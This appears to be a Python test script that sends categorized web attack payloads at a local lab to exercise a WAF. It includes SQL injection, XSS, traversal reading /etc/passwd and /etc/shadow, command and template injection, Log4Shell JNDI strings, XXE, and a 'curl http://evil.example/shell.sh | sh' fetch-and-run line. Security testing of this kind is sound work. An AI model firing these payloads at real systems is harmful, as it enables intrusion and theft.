#!/usr/bin/env python3
"""Drives attack traffic at the lab so the WAF has something to catch.

Each campaign is a separate actor: its own source address and user agent, so the
recorded traffic groups the way a real intrusion attempt would. Payloads are the
standard categories the Core Rule Set is written against.

    python3 test/lab/attacker.py --rounds 3
    python3 test/lab/attacker.py --campaign sqli --host shop.local

Only the local lab is a valid target; see lab.py.
"""

from __future__ import annotations

import argparse
import random
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))
import lab  # noqa: E402

# Each campaign is (query payloads, body payloads, paths), applied to whichever
# app is being targeted.

SQLI = [
    "1' OR '1'='1' -- ",
    "1 UNION SELECT username, password FROM users -- ",
    "1; DROP TABLE orders; -- ",
    "1' AND SLEEP(5) -- ",
    "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x "
    "FROM information_schema.tables GROUP BY x)a) -- ",
    "admin'--",
    "1' UNION ALL SELECT NULL,NULL,table_name FROM information_schema.tables -- ",
]

XSS = [
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "\"><script src=//evil.example/x.js></script>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
]

TRAVERSAL = [
    "../../../../etc/passwd",
    "....//....//....//etc/shadow",
    "/var/www/../../etc/hosts",
    "..%2f..%2f..%2fetc%2fpasswd",
    "/proc/self/environ",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
]

COMMAND = [
    "; cat /etc/passwd",
    "| whoami",
    "$(id)",
    "`uname -a`",
    "&& curl http://evil.example/shell.sh | sh",
    "; ping -c 4 127.0.0.1",
]

SSTI = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "{{config.items()}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
]

NOSQL = [
    '{"$ne": null}',
    '{"$gt": ""}',
    "';return true;var x='",
    '{"username": {"$regex": "^admin"}}',
]

JNDI = [
    "${jndi:ldap://evil.example/a}",
    "${jndi:rmi://127.0.0.1:1099/obj}",
    "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.example/x}",
]

XXE_BODY = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    "<foo>&xxe;</foo>"
)

# Paths a scanner walks looking for something left exposed.
SCANNER_PATHS = [
    "/.env", "/.git/config", "/.git/HEAD", "/admin", "/administrator",
    "/wp-login.php", "/wp-admin/", "/phpmyadmin/", "/server-status",
    "/actuator/env", "/actuator/health", "/config.json", "/backup.sql",
    "/.aws/credentials", "/.ssh/id_rsa", "/api/v1/swagger.json",
    "/debug/pprof/", "/.well-known/security.txt", "/cgi-bin/test.cgi",
]

COMMON_PASSWORDS = [
    "123456", "password", "admin", "letmein", "qwerty",
    "P@ssw0rd", "welcome1", "changeme", "root", "iloveyou",
]


def probe(sess, base, param, payloads, label, results):
    """Send each payload as a query parameter."""
    for payload in payloads:
        status = lab.request(sess, "GET", f"{base}/get", params={param: payload})
        results.append((label, status))


def post_payloads(sess, base, field, payloads, label, results):
    """Send each payload in a form body."""
    for payload in payloads:
        status = lab.request(sess, "POST", f"{base}/post", data={field: payload})
        results.append((label, status))


def campaign_sqli(sess, base, results):
    probe(sess, base, "id", SQLI, "sqli/query", results)
    post_payloads(sess, base, "search", SQLI, "sqli/body", results)
    for payload in SQLI[:3]:
        lab.request(sess, "GET", f"{base}/get", cookies={"session_id": payload})
        results.append(("sqli/cookie", 200))


def campaign_xss(sess, base, results):
    probe(sess, base, "q", XSS, "xss/query", results)
    post_payloads(sess, base, "comment", XSS, "xss/body", results)


def campaign_traversal(sess, base, results):
    probe(sess, base, "file", TRAVERSAL, "traversal/query", results)
    for payload in TRAVERSAL[:3]:
        lab.request(sess, "GET", f"{base}/{payload}")
        results.append(("traversal/path", 0))


def campaign_rce(sess, base, results):
    probe(sess, base, "cmd", COMMAND, "rce/query", results)
    probe(sess, base, "tpl", SSTI, "ssti/query", results)
    probe(sess, base, "user", JNDI, "jndi/query", results)


def campaign_injection(sess, base, results):
    for payload in NOSQL:
        results.append(("nosql/body", lab.request(sess, "POST", f"{base}/post", data={"filter": payload})))
    results.append((
        "xxe/body",
        lab.request(sess, "POST", f"{base}/post", data=XXE_BODY,
                    headers={"Content-Type": "application/xml"}),
    ))


def campaign_scanner(sess, base, results):
    for path in SCANNER_PATHS:
        results.append(("scanner/path", lab.request(sess, "GET", base + path)))


def campaign_credentials(sess, base, results):
    """Credential stuffing against a login form."""
    for password in COMMON_PASSWORDS:
        results.append((
            "credentials",
            lab.request(sess, "POST", f"{base}/post",
                        data={"username": "admin", "password": password}),
        ))


def campaign_headers(sess, base, results):
    """Attacks carried in headers rather than the body or query."""
    cases = [
        ("Referer", "http://evil.example/<script>alert(1)</script>"),
        ("X-Forwarded-Host", "evil.example"),
        ("X-Original-URL", "/admin"),
        ("User-Agent", "() { :; }; /bin/bash -c 'cat /etc/passwd'"),
        ("Content-Type", "../../../etc/passwd"),
    ]
    for name, value in cases:
        results.append((
            f"header/{name.lower()}",
            lab.request(sess, "GET", f"{base}/headers", headers={name: value}),
        ))


CAMPAIGNS = {
    "sqli": ("SQL injection", campaign_sqli),
    "xss": ("Cross-site scripting", campaign_xss),
    "traversal": ("Path traversal and file inclusion", campaign_traversal),
    "rce": ("Command injection, template injection, JNDI", campaign_rce),
    "injection": ("NoSQL and XML external entity", campaign_injection),
    "scanner": ("Exposed path enumeration", campaign_scanner),
    "credentials": ("Credential stuffing", campaign_credentials),
    "headers": ("Header-borne payloads", campaign_headers),
}


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__,
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--rounds", type=int, default=1, help="times to run the whole set")
    parser.add_argument("--host", default=None, help=f"one of {', '.join(lab.LAB_HOSTS)}")
    parser.add_argument("--campaign", default=None, choices=sorted(CAMPAIGNS),
                        help="run a single campaign")
    parser.add_argument("--delay", type=float, default=0.15, help="seconds between requests")
    parser.add_argument("--addr", default=lab.DEFAULT_ADDR, help="loopback address of the proxy")
    args = parser.parse_args()

    try:
        lab.install_lab_dns(args.addr)
        if args.host:
            lab.check_host(args.host)
    except lab.RefusedTarget as exc:
        print(exc, file=sys.stderr)
        return 2

    selected = [args.campaign] if args.campaign else list(CAMPAIGNS)
    targets = [args.host] if args.host else ["shop.local", "api.local", "blog.local"]
    results: list[tuple[str, int]] = []

    for round_no in range(1, args.rounds + 1):
        for name in selected:
            label, run = CAMPAIGNS[name]
            host = random.choice(targets)
            # A campaign is one actor: stable source address and user agent.
            sess = lab.session(random.choice(lab.SCANNERS), lab.random_public_ip())
            print(f"  round {round_no}  {label:<42} -> {host}")
            before = len(results)
            run(sess, lab.base_url(host), results)
            print(f"           {len(results) - before} requests")
            time.sleep(args.delay)

    print(f"\nsent {len(results)} attack requests across {len(selected)} campaigns")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
